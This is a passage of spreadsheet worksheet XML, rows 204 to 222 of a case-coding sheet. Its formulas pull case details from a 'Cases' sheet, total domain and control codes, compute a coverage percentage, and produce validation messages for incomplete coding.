      <c r="D204" s="11">
        <f>IF(Cases!F204="",LEFT(Cases!G204,120),Cases!F204)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E204:L204)=0,"",SUM(E204:L204))</f>
        <v/>
      </c>
      <c r="AJ204" s="13">
        <f>IF(AI204="","",N(E204)*3+N(F204)*2+N(G204)*2+N(H204)*2+N(I204)*2+N(J204)*3+N(K204)*3+N(L204)*3)</f>
        <v/>
      </c>
      <c r="AK204" s="13">
        <f>IF(AI204="","",COUNTIF(N204:AG204,1))</f>
        <v/>
      </c>
      <c r="AL204" s="13">
        <f>IF(OR(AJ204="",AJ204=0),"",ROUND(100*(AJ204-AK204)/AJ204,1))</f>
        <v/>
      </c>
      <c r="AM204" s="11">
        <f>IF(AI204="","",IF(AI204=0,"No domain coded 1; ","")&amp;IF(M204="","Primary domain missing; ",IF(IFERROR(INDEX(E204:L204,1,M204),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N204:AG204)&lt;&gt;AJ204,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH204="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN204" s="13">
        <f>IF(AND(AI204&lt;&gt;"",AM204=""),1,0)</f>
        <v/>
      </c>
      <c r="AO204" s="14" t="n"/>
    </row>
    <row r="205">
      <c r="A205" s="11">
        <f>Cases!A205</f>
        <v/>
      </c>
      <c r="B205" s="11">
        <f>Cases!B205</f>
        <v/>
      </c>
      <c r="C205" s="11">
        <f>Cases!C205</f>
        <v/>
      </c>
      <c r="D205" s="11">
        <f>IF(Cases!F205="",LEFT(Cases!G205,120),Cases!F205)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E205:L205)=0,"",SUM(E205:L205))</f>
        <v/>
      </c>
      <c r="AJ205" s="13">
        <f>IF(AI205="","",N(E205)*3+N(F205)*2+N(G205)*2+N(H205)*2+N(I205)*2+N(J205)*3+N(K205)*3+N(L205)*3)</f>
        <v/>
      </c>
      <c r="AK205" s="13">
        <f>IF(AI205="","",COUNTIF(N205:AG205,1))</f>
        <v/>
      </c>
      <c r="AL205" s="13">
        <f>IF(OR(AJ205="",AJ205=0),"",ROUND(100*(AJ205-AK205)/AJ205,1))</f>
        <v/>
      </c>
      <c r="AM205" s="11">
        <f>IF(AI205="","",IF(AI205=0,"No domain coded 1; ","")&amp;IF(M205="","Primary domain missing; ",IF(IFERROR(INDEX(E205:L205,1,M205),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N205:AG205)&lt;&gt;AJ205,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH205="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN205" s="13">
        <f>IF(AND(AI205&lt;&gt;"",AM205=""),1,0)</f>
        <v/>
      </c>
      <c r="AO205" s="14" t="n"/>
    </row>
    <row r="206">
      <c r="A206" s="11">
        <f>Cases!A206</f>
        <v/>
      </c>
      <c r="B206" s="11">
        <f>Cases!B206</f>
        <v/>
      </c>
      <c r="C206" s="11">
        <f>Cases!C206</f>
        <v/>
      </c>
      <c r="D206" s="11">
        <f>IF(Cases!F206="",LEFT(Cases!G206,120),Cases!F206)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E206:L206)=0,"",SUM(E206:L206))</f>
        <v/>
      </c>
      <c r="AJ206" s="13">
        <f>IF(AI206="","",N(E206)*3+N(F206)*2+N(G206)*2+N(H206)*2+N(I206)*2+N(J206)*3+N(K206)*3+N(L206)*3)</f>
        <v/>
      </c>
      <c r="AK206" s="13">
        <f>IF(AI206="","",COUNTIF(N206:AG206,1))</f>
        <v/>
      </c>
      <c r="AL206" s="13">
        <f>IF(OR(AJ206="",AJ206=0),"",ROUND(100*(AJ206-AK206)/AJ206,1))</f>
        <v/>
      </c>
      <c r="AM206" s="11">
        <f>IF(AI206="","",IF(AI206=0,"No domain coded 1; ","")&amp;IF(M206="","Primary domain missing; ",IF(IFERROR(INDEX(E206:L206,1,M206),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N206:AG206)&lt;&gt;AJ206,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH206="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN206" s="13">
        <f>IF(AND(AI206&lt;&gt;"",AM206=""),1,0)</f>
        <v/>
      </c>
      <c r="AO206" s="14" t="n"/>
    </row>
    <row r="207">
      <c r="A207" s="11">
        <f>Cases!A207</f>
        <v/>
      </c>
      <c r="B207" s="11">
        <f>Cases!B207</f>
        <v/>
      </c>
      <c r="C207" s="11">
        <f>Cases!C207</f>
        <v/>
      </c>
      <c r="D207" s="11">
        <f>IF(Cases!F207="",LEFT(Cases!G207,120),Cases!F207)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E207:L207)=0,"",SUM(E207:L207))</f>
        <v/>
      </c>
      <c r="AJ207" s="13">
        <f>IF(AI207="","",N(E207)*3+N(F207)*2+N(G207)*2+N(H207)*2+N(I207)*2+N(J207)*3+N(K207)*3+N(L207)*3)</f>
        <v/>
      </c>
      <c r="AK207" s="13">
        <f>IF(AI207="","",COUNTIF(N207:AG207,1))</f>
        <v/>
      </c>
      <c r="AL207" s="13">
        <f>IF(OR(AJ207="",AJ207=0),"",ROUND(100*(AJ207-AK207)/AJ207,1))</f>
        <v/>
      </c>
      <c r="AM207" s="11">
        <f>IF(AI207="","",IF(AI207=0,"No domain coded 1; ","")&amp;IF(M207="","Primary domain missing; ",IF(IFERROR(INDEX(E207:L207,1,M207),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N207:AG207)&lt;&gt;AJ207,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH207="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN207" s="13">
        <f>IF(AND(AI207&lt;&gt;"",AM207=""),1,0)</f>
        <v/>
      </c>
      <c r="AO207" s="14" t="n"/>
    </row>
    <row r="208">
      <c r="A208" s="11">
        <f>Cases!A208</f>
        <v/>
      </c>
      <c r="B208" s="11">
        <f>Cases!B208</f>
        <v/>
      </c>
      <c r="C208" s="11">
        <f>Cases!C208</f>
        <v/>
      </c>
      <c r="D208" s="11">
        <f>IF(Cases!F208="",LEFT(Cases!G208,120),Cases!F208)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E208:L208)=0,"",SUM(E208:L208))</f>
        <v/>
      </c>
      <c r="AJ208" s="13">
        <f>IF(AI208="","",N(E208)*3+N(F208)*2+N(G208)*2+N(H208)*2+N(I208)*2+N(J208)*3+N(K208)*3+N(L208)*3)</f>
        <v/>
      </c>
      <c r="AK208" s="13">
        <f>IF(AI208="","",COUNTIF(N208:AG208,1))</f>
        <v/>
      </c>
      <c r="AL208" s="13">
        <f>IF(OR(AJ208="",AJ208=0),"",ROUND(100*(AJ208-AK208)/AJ208,1))</f>
        <v/>
      </c>
      <c r="AM208" s="11">
        <f>IF(AI208="","",IF(AI208=0,"No domain coded 1; ","")&amp;IF(M208="","Primary domain missing; ",IF(IFERROR(INDEX(E208:L208,1,M208),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N208:AG208)&lt;&gt;AJ208,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH208="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN208" s="13">
        <f>IF(AND(AI208&lt;&gt;"",AM208=""),1,0)</f>
        <v/>
      </c>
      <c r="AO208" s="14" t="n"/>
    </row>
    <row r="209">
      <c r="A209" s="11">
        <f>Cases!A209</f>
        <v/>
      </c>
      <c r="B209" s="11">
        <f>Cases!B209</f>
        <v/>
      </c>
      <c r="C209" s="11">
        <f>Cases!C209</f>
        <v/>
      </c>
      <c r="D209" s="11">
        <f>IF(Cases!F209="",LEFT(Cases!G209,120),Cases!F209)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E209:L209)=0,"",SUM(E209:L209))</f>
        <v/>
      </c>
      <c r="AJ209" s="13">
        <f>IF(AI209="","",N(E209)*3+N(F209)*2+N(G209)*2+N(H209)*2+N(I209)*2+N(J209)*3+N(K209)*3+N(L209)*3)</f>
        <v/>
      </c>
      <c r="AK209" s="13">
        <f>IF(AI209="","",COUNTIF(N209:AG209,1))</f>
        <v/>
      </c>
      <c r="AL209" s="13">
        <f>IF(OR(AJ209="",AJ209=0),"",ROUND(100*(AJ209-AK209)/AJ209,1))</f>
        <v/>
      </c>
      <c r="AM209" s="11">
        <f>IF(AI209="","",IF(AI209=0,"No domain coded 1; ","")&amp;IF(M209="","Primary domain missing; ",IF(IFERROR(INDEX(E209:L209,1,M209),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N209:AG209)&lt;&gt;AJ209,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH209="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN209" s="13">
        <f>IF(AND(AI209&lt;&gt;"",AM209=""),1,0)</f>
        <v/>
      </c>
      <c r="AO209" s="14" t="n"/>
    </row>
    <row r="210">
      <c r="A210" s="11">
        <f>Cases!A210</f>
        <v/>
      </c>
      <c r="B210" s="11">
        <f>Cases!B210</f>
        <v/>
      </c>
      <c r="C210" s="11">
        <f>Cases!C210</f>
        <v/>
      </c>
      <c r="D210" s="11">
        <f>IF(Cases!F210="",LEFT(Cases!G210,120),Cases!F210)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E210:L210)=0,"",SUM(E210:L210))</f>
        <v/>
      </c>
      <c r="AJ210" s="13">
        <f>IF(AI210="","",N(E210)*3+N(F210)*2+N(G210)*2+N(H210)*2+N(I210)*2+N(J210)*3+N(K210)*3+N(L210)*3)</f>
        <v/>
      </c>
      <c r="AK210" s="13">
        <f>IF(AI210="","",COUNTIF(N210:AG210,1))</f>
        <v/>
      </c>
      <c r="AL210" s="13">
        <f>IF(OR(AJ210="",AJ210=0),"",ROUND(100*(AJ210-AK210)/AJ210,1))</f>
        <v/>
      </c>
      <c r="AM210" s="11">
        <f>IF(AI210="","",IF(AI210=0,"No domain coded 1; ","")&amp;IF(M210="","Primary domain missing; ",IF(IFERROR(INDEX(E210:L210,1,M210),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N210:AG210)&lt;&gt;AJ210,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH210="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN210" s="13">
        <f>IF(AND(AI210&lt;&gt;"",AM210=""),1,0)</f>
        <v/>
      </c>
      <c r="AO210" s="14" t="n"/>
    </row>
    <row r="211">
      <c r="A211" s="11">
        <f>Cases!A211</f>
        <v/>
      </c>
      <c r="B211" s="11">
        <f>Cases!B211</f>
        <v/>
      </c>
      <c r="C211" s="11">
        <f>Cases!C211</f>
        <v/>
      </c>
      <c r="D211" s="11">
        <f>IF(Cases!F211="",LEFT(Cases!G211,120),Cases!F211)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E211:L211)=0,"",SUM(E211:L211))</f>
        <v/>
      </c>
      <c r="AJ211" s="13">
        <f>IF(AI211="","",N(E211)*3+N(F211)*2+N(G211)*2+N(H211)*2+N(I211)*2+N(J211)*3+N(K211)*3+N(L211)*3)</f>
        <v/>
      </c>
      <c r="AK211" s="13">
        <f>IF(AI211="","",COUNTIF(N211:AG211,1))</f>
        <v/>
      </c>
      <c r="AL211" s="13">
        <f>IF(OR(AJ211="",AJ211=0),"",ROUND(100*(AJ211-AK211)/AJ211,1))</f>
        <v/>
      </c>
      <c r="AM211" s="11">
        <f>IF(AI211="","",IF(AI211=0,"No domain coded 1; ","")&amp;IF(M211="","Primary domain missing; ",IF(IFERROR(INDEX(E211:L211,1,M211),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N211:AG211)&lt;&gt;AJ211,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH211="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN211" s="13">
        <f>IF(AND(AI211&lt;&gt;"",AM211=""),1,0)</f>
        <v/>
      </c>
      <c r="AO211" s="14" t="n"/>
    </row>
    <row r="212">
      <c r="A212" s="11">
        <f>Cases!A212</f>
        <v/>
      </c>
      <c r="B212" s="11">
        <f>Cases!B212</f>
        <v/>
      </c>
      <c r="C212" s="11">
        <f>Cases!C212</f>
        <v/>
      </c>
      <c r="D212" s="11">
        <f>IF(Cases!F212="",LEFT(Cases!G212,120),Cases!F212)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E212:L212)=0,"",SUM(E212:L212))</f>
        <v/>
      </c>
      <c r="AJ212" s="13">
        <f>IF(AI212="","",N(E212)*3+N(F212)*2+N(G212)*2+N(H212)*2+N(I212)*2+N(J212)*3+N(K212)*3+N(L212)*3)</f>
        <v/>
      </c>
      <c r="AK212" s="13">
        <f>IF(AI212="","",COUNTIF(N212:AG212,1))</f>
        <v/>
      </c>
      <c r="AL212" s="13">
        <f>IF(OR(AJ212="",AJ212=0),"",ROUND(100*(AJ212-AK212)/AJ212,1))</f>
        <v/>
      </c>
      <c r="AM212" s="11">
        <f>IF(AI212="","",IF(AI212=0,"No domain coded 1; ","")&amp;IF(M212="","Primary domain missing; ",IF(IFERROR(INDEX(E212:L212,1,M212),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N212:AG212)&lt;&gt;AJ212,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH212="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN212" s="13">
        <f>IF(AND(AI212&lt;&gt;"",AM212=""),1,0)</f>
        <v/>
      </c>
      <c r="AO212" s="14" t="n"/>
    </row>
    <row r="213">
      <c r="A213" s="11">
        <f>Cases!A213</f>
        <v/>
      </c>
      <c r="B213" s="11">
        <f>Cases!B213</f>
        <v/>
      </c>
      <c r="C213" s="11">
        <f>Cases!C213</f>
        <v/>
      </c>
      <c r="D213" s="11">
        <f>IF(Cases!F213="",LEFT(Cases!G213,120),Cases!F213)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E213:L213)=0,"",SUM(E213:L213))</f>
        <v/>
      </c>
      <c r="AJ213" s="13">
        <f>IF(AI213="","",N(E213)*3+N(F213)*2+N(G213)*2+N(H213)*2+N(I213)*2+N(J213)*3+N(K213)*3+N(L213)*3)</f>
        <v/>
      </c>
      <c r="AK213" s="13">
        <f>IF(AI213="","",COUNTIF(N213:AG213,1))</f>
        <v/>
      </c>
      <c r="AL213" s="13">
        <f>IF(OR(AJ213="",AJ213=0),"",ROUND(100*(AJ213-AK213)/AJ213,1))</f>
        <v/>
      </c>
      <c r="AM213" s="11">
        <f>IF(AI213="","",IF(AI213=0,"No domain coded 1; ","")&amp;IF(M213="","Primary domain missing; ",IF(IFERROR(INDEX(E213:L213,1,M213),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N213:AG213)&lt;&gt;AJ213,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH213="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN213" s="13">
        <f>IF(AND(AI213&lt;&gt;"",AM213=""),1,0)</f>
        <v/>
      </c>
      <c r="AO213" s="14" t="n"/>
    </row>
    <row r="214">
      <c r="A214" s="11">
        <f>Cases!A214</f>
        <v/>
      </c>
      <c r="B214" s="11">
        <f>Cases!B214</f>
        <v/>
      </c>
      <c r="C214" s="11">
        <f>Cases!C214</f>
        <v/>
      </c>
      <c r="D214" s="11">
        <f>IF(Cases!F214="",LEFT(Cases!G214,120),Cases!F214)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E214:L214)=0,"",SUM(E214:L214))</f>
        <v/>
      </c>
      <c r="AJ214" s="13">
        <f>IF(AI214="","",N(E214)*3+N(F214)*2+N(G214)*2+N(H214)*2+N(I214)*2+N(J214)*3+N(K214)*3+N(L214)*3)</f>
        <v/>
      </c>
      <c r="AK214" s="13">
        <f>IF(AI214="","",COUNTIF(N214:AG214,1))</f>
        <v/>
      </c>
      <c r="AL214" s="13">
        <f>IF(OR(AJ214="",AJ214=0),"",ROUND(100*(AJ214-AK214)/AJ214,1))</f>
        <v/>
      </c>
      <c r="AM214" s="11">
        <f>IF(AI214="","",IF(AI214=0,"No domain coded 1; ","")&amp;IF(M214="","Primary domain missing; ",IF(IFERROR(INDEX(E214:L214,1,M214),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N214:AG214)&lt;&gt;AJ214,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH214="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN214" s="13">
        <f>IF(AND(AI214&lt;&gt;"",AM214=""),1,0)</f>
        <v/>
      </c>
      <c r="AO214" s="14" t="n"/>
    </row>
    <row r="215">
      <c r="A215" s="11">
        <f>Cases!A215</f>
        <v/>
      </c>
      <c r="B215" s="11">
        <f>Cases!B215</f>
        <v/>
      </c>
      <c r="C215" s="11">
        <f>Cases!C215</f>
        <v/>
      </c>
      <c r="D215" s="11">
        <f>IF(Cases!F215="",LEFT(Cases!G215,120),Cases!F215)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E215:L215)=0,"",SUM(E215:L215))</f>
        <v/>
      </c>
      <c r="AJ215" s="13">
        <f>IF(AI215="","",N(E215)*3+N(F215)*2+N(G215)*2+N(H215)*2+N(I215)*2+N(J215)*3+N(K215)*3+N(L215)*3)</f>
        <v/>
      </c>
      <c r="AK215" s="13">
        <f>IF(AI215="","",COUNTIF(N215:AG215,1))</f>
        <v/>
      </c>
      <c r="AL215" s="13">
        <f>IF(OR(AJ215="",AJ215=0),"",ROUND(100*(AJ215-AK215)/AJ215,1))</f>
        <v/>
      </c>
      <c r="AM215" s="11">
        <f>IF(AI215="","",IF(AI215=0,"No domain coded 1; ","")&amp;IF(M215="","Primary domain missing; ",IF(IFERROR(INDEX(E215:L215,1,M215),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N215:AG215)&lt;&gt;AJ215,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH215="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN215" s="13">
        <f>IF(AND(AI215&lt;&gt;"",AM215=""),1,0)</f>
        <v/>
      </c>
      <c r="AO215" s="14" t="n"/>
    </row>
    <row r="216">
      <c r="A216" s="11">
        <f>Cases!A216</f>
        <v/>
      </c>
      <c r="B216" s="11">
        <f>Cases!B216</f>
        <v/>
      </c>
      <c r="C216" s="11">
        <f>Cases!C216</f>
        <v/>
      </c>
      <c r="D216" s="11">
        <f>IF(Cases!F216="",LEFT(Cases!G216,120),Cases!F216)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E216:L216)=0,"",SUM(E216:L216))</f>
        <v/>
      </c>
      <c r="AJ216" s="13">
        <f>IF(AI216="","",N(E216)*3+N(F216)*2+N(G216)*2+N(H216)*2+N(I216)*2+N(J216)*3+N(K216)*3+N(L216)*3)</f>
        <v/>
      </c>
      <c r="AK216" s="13">
        <f>IF(AI216="","",COUNTIF(N216:AG216,1))</f>
        <v/>
      </c>
      <c r="AL216" s="13">
        <f>IF(OR(AJ216="",AJ216=0),"",ROUND(100*(AJ216-AK216)/AJ216,1))</f>
        <v/>
      </c>
      <c r="AM216" s="11">
        <f>IF(AI216="","",IF(AI216=0,"No domain coded 1; ","")&amp;IF(M216="","Primary domain missing; ",IF(IFERROR(INDEX(E216:L216,1,M216),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N216:AG216)&lt;&gt;AJ216,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH216="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN216" s="13">
        <f>IF(AND(AI216&lt;&gt;"",AM216=""),1,0)</f>
        <v/>
      </c>
      <c r="AO216" s="14" t="n"/>
    </row>
    <row r="217">
      <c r="A217" s="11">
        <f>Cases!A217</f>
        <v/>
      </c>
      <c r="B217" s="11">
        <f>Cases!B217</f>
        <v/>
      </c>
      <c r="C217" s="11">
        <f>Cases!C217</f>
        <v/>
      </c>
      <c r="D217" s="11">
        <f>IF(Cases!F217="",LEFT(Cases!G217,120),Cases!F217)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E217:L217)=0,"",SUM(E217:L217))</f>
        <v/>
      </c>
      <c r="AJ217" s="13">
        <f>IF(AI217="","",N(E217)*3+N(F217)*2+N(G217)*2+N(H217)*2+N(I217)*2+N(J217)*3+N(K217)*3+N(L217)*3)</f>
        <v/>
      </c>
      <c r="AK217" s="13">
        <f>IF(AI217="","",COUNTIF(N217:AG217,1))</f>
        <v/>
      </c>
      <c r="AL217" s="13">
        <f>IF(OR(AJ217="",AJ217=0),"",ROUND(100*(AJ217-AK217)/AJ217,1))</f>
        <v/>
      </c>
      <c r="AM217" s="11">
        <f>IF(AI217="","",IF(AI217=0,"No domain coded 1; ","")&amp;IF(M217="","Primary domain missing; ",IF(IFERROR(INDEX(E217:L217,1,M217),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N217:AG217)&lt;&gt;AJ217,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH217="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN217" s="13">
        <f>IF(AND(AI217&lt;&gt;"",AM217=""),1,0)</f>
        <v/>
      </c>
      <c r="AO217" s="14" t="n"/>
    </row>
    <row r="218">
      <c r="A218" s="11">
        <f>Cases!A218</f>
        <v/>
      </c>
      <c r="B218" s="11">
        <f>Cases!B218</f>
        <v/>
      </c>
      <c r="C218" s="11">
        <f>Cases!C218</f>
        <v/>
      </c>
      <c r="D218" s="11">
        <f>IF(Cases!F218="",LEFT(Cases!G218,120),Cases!F218)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E218:L218)=0,"",SUM(E218:L218))</f>
        <v/>
      </c>
      <c r="AJ218" s="13">
        <f>IF(AI218="","",N(E218)*3+N(F218)*2+N(G218)*2+N(H218)*2+N(I218)*2+N(J218)*3+N(K218)*3+N(L218)*3)</f>
        <v/>
      </c>
      <c r="AK218" s="13">
        <f>IF(AI218="","",COUNTIF(N218:AG218,1))</f>
        <v/>
      </c>
      <c r="AL218" s="13">
        <f>IF(OR(AJ218="",AJ218=0),"",ROUND(100*(AJ218-AK218)/AJ218,1))</f>
        <v/>
      </c>
      <c r="AM218" s="11">
        <f>IF(AI218="","",IF(AI218=0,"No domain coded 1; ","")&amp;IF(M218="","Primary domain missing; ",IF(IFERROR(INDEX(E218:L218,1,M218),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N218:AG218)&lt;&gt;AJ218,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH218="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN218" s="13">
        <f>IF(AND(AI218&lt;&gt;"",AM218=""),1,0)</f>
        <v/>
      </c>
      <c r="AO218" s="14" t="n"/>
    </row>
    <row r="219">
      <c r="A219" s="11">
        <f>Cases!A219</f>
        <v/>
      </c>
      <c r="B219" s="11">
        <f>Cases!B219</f>
        <v/>
      </c>
      <c r="C219" s="11">
        <f>Cases!C219</f>
        <v/>
      </c>
      <c r="D219" s="11">
        <f>IF(Cases!F219="",LEFT(Cases!G219,120),Cases!F219)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E219:L219)=0,"",SUM(E219:L219))</f>
        <v/>
      </c>
      <c r="AJ219" s="13">
        <f>IF(AI219="","",N(E219)*3+N(F219)*2+N(G219)*2+N(H219)*2+N(I219)*2+N(J219)*3+N(K219)*3+N(L219)*3)</f>
        <v/>
      </c>
      <c r="AK219" s="13">
        <f>IF(AI219="","",COUNTIF(N219:AG219,1))</f>
        <v/>
      </c>
      <c r="AL219" s="13">
        <f>IF(OR(AJ219="",AJ219=0),"",ROUND(100*(AJ219-AK219)/AJ219,1))</f>
        <v/>
      </c>
      <c r="AM219" s="11">
        <f>IF(AI219="","",IF(AI219=0,"No domain coded 1; ","")&amp;IF(M219="","Primary domain missing; ",IF(IFERROR(INDEX(E219:L219,1,M219),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N219:AG219)&lt;&gt;AJ219,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH219="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN219" s="13">
        <f>IF(AND(AI219&lt;&gt;"",AM219=""),1,0)</f>
        <v/>
      </c>
      <c r="AO219" s="14" t="n"/>
    </row>
    <row r="220">
      <c r="A220" s="11">
        <f>Cases!A220</f>
        <v/>
      </c>
      <c r="B220" s="11">
        <f>Cases!B220</f>
        <v/>
      </c>
      <c r="C220" s="11">
        <f>Cases!C220</f>
        <v/>
      </c>
      <c r="D220" s="11">
        <f>IF(Cases!F220="",LEFT(Cases!G220,120),Cases!F220)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E220:L220)=0,"",SUM(E220:L220))</f>
        <v/>
      </c>
      <c r="AJ220" s="13">
        <f>IF(AI220="","",N(E220)*3+N(F220)*2+N(G220)*2+N(H220)*2+N(I220)*2+N(J220)*3+N(K220)*3+N(L220)*3)</f>
        <v/>
      </c>
      <c r="AK220" s="13">
        <f>IF(AI220="","",COUNTIF(N220:AG220,1))</f>
        <v/>
      </c>
      <c r="AL220" s="13">
        <f>IF(OR(AJ220="",AJ220=0),"",ROUND(100*(AJ220-AK220)/AJ220,1))</f>
        <v/>
      </c>
      <c r="AM220" s="11">
        <f>IF(AI220="","",IF(AI220=0,"No domain coded 1; ","")&amp;IF(M220="","Primary domain missing; ",IF(IFERROR(INDEX(E220:L220,1,M220),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N220:AG220)&lt;&gt;AJ220,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH220="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN220" s="13">
        <f>IF(AND(AI220&lt;&gt;"",AM220=""),1,0)</f>
        <v/>
      </c>
      <c r="AO220" s="14" t="n"/>
    </row>
    <row r="221">
      <c r="A221" s="11">
        <f>Cases!A221</f>
        <v/>
      </c>
      <c r="B221" s="11">
        <f>Cases!B221</f>
        <v/>
      </c>
      <c r="C221" s="11">
        <f>Cases!C221</f>
        <v/>
      </c>
      <c r="D221" s="11">
        <f>IF(Cases!F221="",LEFT(Cases!G221,120),Cases!F221)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E221:L221)=0,"",SUM(E221:L221))</f>
        <v/>
      </c>
      <c r="AJ221" s="13">
        <f>IF(AI221="","",N(E221)*3+N(F221)*2+N(G221)*2+N(H221)*2+N(I221)*2+N(J221)*3+N(K221)*3+N(L221)*3)</f>
        <v/>
      </c>
      <c r="AK221" s="13">
        <f>IF(AI221="","",COUNTIF(N221:AG221,1))</f>
        <v/>
      </c>
      <c r="AL221" s="13">
        <f>IF(OR(AJ221="",AJ221=0),"",ROUND(100*(AJ221-AK221)/AJ221,1))</f>
        <v/>
      </c>
      <c r="AM221" s="11">
        <f>IF(AI221="","",IF(AI221=0,"No domain coded 1; ","")&amp;IF(M221="","Primary domain missing; ",IF(IFERROR(INDEX(E221:L221,1,M221),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N221:AG221)&lt;&gt;AJ221,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH221="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN221" s="13">
        <f>IF(AND(AI221&lt;&gt;"",AM221=""),1,0)</f>
        <v/>
      </c>
      <c r="AO221" s="14" t="n"/>
    </row>
    <row r="222">
      <c r="A222" s="11">
        <f>Cases!A222</f>
        <v/>
      </c>
      <c r="B222" s="11">
        <f>Cases!B222</f>
        <v/>
      </c>
      <c r="C222" s="11">
        <f>Cases!C222</f>
        <v/>
      </c>
      <c r="D222" s="11">
        <f>IF(Cases!F222="",LEFT(Cases!G222,120),Cases!F222)</f>
        <v/>
      </c>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3">
        <f>IF(COUNT(E222:L222)=0,"",SUM(E222:L222))</f>
        <v/>
      </c>
      <c r="AJ222" s="13">
        <f>IF(AI222="","",N(E222)*3+N(F222)*2+N(G222)*2+N(H222)*2+N(I222)*2+N(J222)*3+N(K222)*3+N(L222)*3)</f>
        <v/>
      </c>
      <c r="AK222" s="13">
        <f>IF(AI222="","",COUNTIF(N222:AG222,1))</f>
        <v/>
      </c>
      <c r="AL222" s="13">
        <f>IF(OR(AJ222="",AJ222=0),"",ROUND(100*(AJ222-AK222)/AJ222,1))</f>
        <v/>
      </c>
      <c r="AM222" s="11">
        <f>IF(AI222="","",IF(AI222=0,"No domain coded 1; ","")&amp;IF(M222="","Primary domain missing; ",IF(IFERROR(INDEX(E222:L222,1,M222),0)&lt;&gt;1,"Primary domain not coded 1; ",""))&amp;IF(COUNT(N222:AG222)&lt;&gt;AJ222,"Code 1 or 0 for exactly the controls of domains coded 1 (NA for the rest); ","")&amp;IF(AH222="","Covered missing; ",""))</f>
        <v/>
      </c>
      <c r="AN222" s="13">
        <f>IF(AND(AI222&lt;&gt;"",AM222=""),1,0)</f>
        <v/>
      </c>
      <c r="AO222" s="14" t="n"/>
    </row>
    <row r="223">
